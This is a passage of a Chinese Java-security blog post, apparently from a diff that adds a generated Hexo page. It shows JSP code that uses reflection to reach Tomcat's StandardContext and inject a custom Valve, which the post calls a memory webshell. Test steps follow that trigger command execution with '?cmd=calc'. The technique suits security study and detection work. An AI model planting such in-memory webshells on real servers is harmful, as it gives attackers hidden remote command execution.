从request中获取servletContext</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从servletContext中获取applicationContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);</span><br><span class="line">    <span class="comment">// 从applicationContext中获取standardContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line">    standardContext.getPipeline().addValve(<span class="keyword">new</span> <span class="title class_">ValveTest</span>());</span><br><span class="line">    out.println(<span class="string">&quot;yes&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>测试:</p>
+<ol>
+<li>启动项目</li>
+<li>访问jsp文件</li>
+<li>访问请求带参数?cmd=calc</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="子非鱼 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="子非鱼 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"># 安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/10/25/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BSpring-Interceptor%E5%86%85%E5%AD%98%E9%A9%AC/" rel="prev" title="Java安全之Spring Interceptor内存马">
+                  <i class="fa fa-angle-left"></i> Java安全之Spring Interceptor内存马
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">子非鱼</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
